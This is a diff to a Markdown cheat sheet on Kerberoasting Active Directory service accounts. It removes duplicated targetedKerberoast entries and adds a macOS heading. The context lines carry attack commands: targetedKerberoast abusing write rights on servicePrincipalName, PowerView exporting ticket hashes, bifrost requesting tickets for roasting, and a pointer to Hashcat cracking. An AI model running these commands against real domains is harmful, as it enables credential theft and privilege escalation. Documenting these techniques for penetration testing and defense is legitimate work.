@@ -37,8 +37,6 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
 * **for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute),**  
   **print the "kerberoast" hash, and delete the temporary SPN set for that operation**  
   ```bash
-  # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute),
-  # print the "kerberoast" hash, and delete the temporary SPN set for that operation
   targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
   ```
 ## Windows
@@ -140,19 +138,12 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
   Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
   ```
 
+### Mac(osX)
 * **[bifrost](https://github.com/its-a-feature/bifrost) on macOS machine**  
 
   ```powershell
   ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
   ```
-
-* **[targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)**  
-
-  ```powershell
-  # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), 
-  # print the "kerberoast" hash, and delete the temporary SPN set for that operation
-  targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
-   ```
 
 ## Cracking w/ Hashcat
 * **Crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`)**  
